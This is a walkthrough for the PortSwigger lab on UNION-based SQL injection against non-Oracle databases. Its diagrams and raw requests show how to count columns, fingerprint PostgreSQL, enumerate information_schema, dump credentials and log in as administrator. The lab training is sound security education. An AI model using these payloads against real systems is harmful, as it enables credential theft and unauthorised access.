# SQL Injection - Lab #9: SQL injection attack, listing the database contents on non-Oracle databases

**YouTube Tutorial:** [SQL Injection - Lab #9 SQL injection attack, listing the database contents on non Oracle databases](https://www.youtube.com/watch?v=JduM_dO8glw)

---

## 1. Attack Overview & Key Concepts

### Vulnerability Explanation

* **Core Concept:** A SQL injection vulnerability exists in the product category filter (`category`). The application executes user input directly into a backend database query and renders the resulting data directly within the HTTP response.
* **Vulnerability Behavior:** Because the database response is displayed on-screen, an attacker can use a `UNION`-based SQL injection to query database metadata (`information_schema`) and retrieve sensitive user credentials from custom user tables.

### Root Cause & Impact

* **Root Cause:** Dynamic query construction via unescaped string concatenation without parameterization.
* **Database Information Schema:** Non-Oracle databases (such as PostgreSQL and MySQL) implement standard ANSI Information Schema views (`information_schema.tables` and `information_schema.columns`). Attackers can inspect these tables to perform schema discovery (enumerating custom table and column names).
* **Goal:** Determine column counts, identify the database engine (PostgreSQL), enumerate table and column names from `information_schema`, extract administrator credentials, and authenticate as `administrator`.

---

## 2. Attack Methods & Techniques

### Method Details

* **Phase 1 (Column Count & Data Types):** Determine total columns using `ORDER BY N--` and confirm string compatibility via `UNION SELECT 'a', 'a'--`.
* **Phase 2 (Database Identification):** Inject version queries (`@@version` vs. `version()`) to identify the underlying database management system (PostgreSQL).
* **Phase 3 (Table Enumeration):** Query `information_schema.tables` to discover the custom table storing user credentials (e.g., `users_xacgsm`).
* **Phase 4 (Column Enumeration):** Query `information_schema.columns` filtering by `table_name` to identify the specific column names for usernames and passwords (e.g., `username_xyz`, `password_abc`).
* **Phase 5 (Credential Extraction & Authentication):** Perform a `UNION SELECT` from the discovered table to retrieve the administrator password and log into the application.

### Server Behavior

* **Querying Non-Existent Column Numbers / Invalid Syntax:** Returns an **HTTP 500 Internal Server Error**.
* **Successful Schema / Credential Queries:** Returns an **HTTP 200 OK** response and displays the queried table names, column names, or user credentials inside the HTML response body.

---

## 3. Attack Flowchart

```
+-------------------------------------------------------+
|  Step 1: Intercept Product Filter Request (category)  |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 2: Determine Column Count & Data Types          |
|  • ORDER BY 3--  -> HTTP 500 (Columns = 2)            |
|  • UNION SELECT 'a', 'a'-- -> HTTP 200 OK             |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 3: Identify Database Engine                     |
|  • UNION SELECT @@version, NULL-- -> HTTP 500         |
|  • UNION SELECT version(), NULL--   -> HTTP 200 OK    |
|  Result: Engine is PostgreSQL                         |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 4: Enumerate Table Names                        |
|  UNION SELECT table_name, NULL FROM                   |
|  information_schema.tables--                          |
|  Result: Discovered table 'users_xacgsm'               |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 5: Enumerate Column Names                       |
|  UNION SELECT column_name, NULL FROM                  |
|  information_schema.columns WHERE                     |
|  table_name='users_xacgsm'--                          |
|  Result: Discovered columns 'username_...', 'password_...'|
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 6: Dump Credentials & Authenticate              |
|  UNION SELECT username_..., password_...              |
|  FROM users_xacgsm--                                  |
|  Log in as 'administrator' to solve lab               |
+-------------------------------------------------------+

```

---

## 4. UML Sequence Diagram

```
Browser / User          Burp Suite Proxy          Web Application               Database (PostgreSQL)
      |                         |                        |                         |
      |-- 1. GET /filter?cat=Gifts' ORDER BY 3-- ------>|                         |
      |                         |                        |-- 2. Execute SQL ------>|
      |<-- 3. HTTP 500 Error ---|<-- 4. Return 500 -------|<-- 5. Column Error -----|
      |                         |                        |                         |
      |-- 6. GET /filter?cat=Gifts' UNION SELECT version(), NULL-- --------------->|
      |                         |                        |-- 7. Execute SQL ------>|
      |<-- 8. HTTP 200 OK ------|<-- 9. PostgreSQL -----|<-- 10. PostgreSQL 11 ---|
      |                         |                        |                         |
      |-- 11. GET /filter?cat=Gifts' UNION SELECT table_name, NULL FROM info_schema.tables-- ->|
      |                         |                        |-- 12. Query Tables ---->|
      |<-- 13. HTTP 200 OK -----|<-- 14. Render List ---|<-- 15. 'users_xacgsm'---|
      |                         |                        |                         |
      |-- 16. GET /filter?cat=Gifts' UNION SELECT column_name, NULL FROM info_schema.columns... ->|
      |                         |                        |-- 17. Query Columns --->|
      |<-- 18. HTTP 200 OK -----|<-- 19. Render List ---|<-- 20. Col Names -------|
      |                         |                        |                         |
      |-- 21. GET /filter?cat=Gifts' UNION SELECT username_..., password_... FROM users_... --->|
      |                         |                        |-- 22. Extract DUMP ----->|
      |<-- 23. HTTP 200 OK -----|<-- 24. Render Creds --|<-- 25. admin:pass -------|
      |                         |                        |                         |
      |-- 26. POST /login (administrator:[password]) --->|                         |
      |<-- 27. Lab Solved! -----|<-- 28. 302 Redirect --|                         |

```

---

## 5. Step-by-Step Walkthrough

### Step 1: Verify Column Count & Data Compatibility

1. Test ordering:
* `category=Gifts'+ORDER+BY+1--` $\rightarrow$ **HTTP 200 OK**
* `category=Gifts'+ORDER+BY+2--` $\rightarrow$ **HTTP 200 OK**
* `category=Gifts'+ORDER+BY+3--` $\rightarrow$ **HTTP 500 Internal Server Error**


2. Confirm string capability for both columns:
* `category=Gifts'+UNION+SELECT+'a',+'a'--` $\rightarrow$ **HTTP 200 OK** (Both columns accept string data).



### Step 2: Fingerprint the Database Engine

1. Test Microsoft SQL Server syntax:
* `category=Gifts'+UNION+SELECT+@@version,+NULL--` $\rightarrow$ **HTTP 500 Internal Server Error**


2. Test PostgreSQL / MySQL syntax:
* `category=Gifts'+UNION+SELECT+version(),+NULL--` $\rightarrow$ **HTTP 200 OK**


3. **Result:** Server displays `PostgreSQL 11.11...`, confirming PostgreSQL.

### Step 3: Discover Table Names

Query `information_schema.tables` to list all tables in the database:

* **Payload:**
```sql
Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--

```


* **Raw Request:**
```http
GET /filter?category=Gifts%27+UNION+SELECT+table_name%2C+NULL+FROM+information_schema.tables-- HTTP/1.1
Host: [LAB-ID].web-security-academy.net

```


* **Result:** Browse the rendered HTTP response to find the dynamically generated users table (e.g., `users_xacgsm`).

### Step 4: Discover Column Names

Query `information_schema.columns` to find the dynamic column names for the discovered table:

* **Payload:**
```sql
Gifts' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_xacgsm'--

```


* **Raw Request:**
```http
GET /filter?category=Gifts%27+UNION+SELECT+column_name%2C+NULL+FROM+information_schema.columns+WHERE+table_name%3D%27users_xacgsm%27-- HTTP/1.1
Host: [LAB-ID].web-security-academy.net

```


* **Result:** Identifies the column names for usernames and passwords (e.g., `username_xyz` and `password_abc`).

### Step 5: Dump Administrator Credentials & Authenticate

Query the target table using the exact table and column names retrieved in previous steps:

* **Payload:**
```sql
Gifts' UNION SELECT username_xyz, password_abc FROM users_xacgsm--

```


* **Raw Request:**
```http
GET /filter?category=Gifts%27+UNION+SELECT+username_xyz%2C+password_abc+FROM+users_xacgsm-- HTTP/1.1
Host: [LAB-ID].web-security-academy.net

```


* **Extract Credentials:** Copy the password associated with the `administrator` user from the HTML output.
* **Complete Lab:** Navigate to the `/login` page, submit `administrator` with the retrieved password, and log in.

---

## 6. Pro-Tips & Common Pitfalls

* **Dynamic Table & Column Names:** PortSwigger dynamic labs generate random alphanumeric suffixes for table names (e.g., `users_xxxxxx`) and column names (e.g., `username_xxxxxx`, `password_xxxxxx`). You cannot hardcode table names from static writeups—you must perform step-by-step schema discovery.
* **Quote Constraints in SQL Filtering:** When filtering by `table_name='users_xxxxxx'`, ensure single quotes around the table name are not stripped or corrupted during URL encoding (`%27users_xxxxxx%27`).
* **Cross-Database Information Schemas:**
* **PostgreSQL / MySQL / MSSQL:** Query `information_schema.tables` and `information_schema.columns`.
* **Oracle:** Query `all_tables` (or `user_tables`) and `all_tab_columns` (or `user_tab_columns`).